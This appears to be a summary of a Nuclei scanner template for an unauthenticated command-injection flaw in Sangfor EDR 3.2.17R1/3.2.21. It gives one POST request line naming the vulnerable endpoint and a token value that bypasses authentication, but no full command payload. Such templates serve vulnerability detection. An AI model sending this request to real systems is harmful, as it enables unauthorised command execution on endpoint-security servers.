# Nuclei Template: Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution
**Template ID:** sangfor-edr-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`sangfor-edr-rce.yaml`)

## Vulnerability Information & PoC

## Description
Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to to execute arbitrary commands.

## Steps to reproduce / Exploit Payload
```http
POST {{BaseURL}}/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
```

## References
- https://www.cnblogs.com/0day-li/p/13650452.html
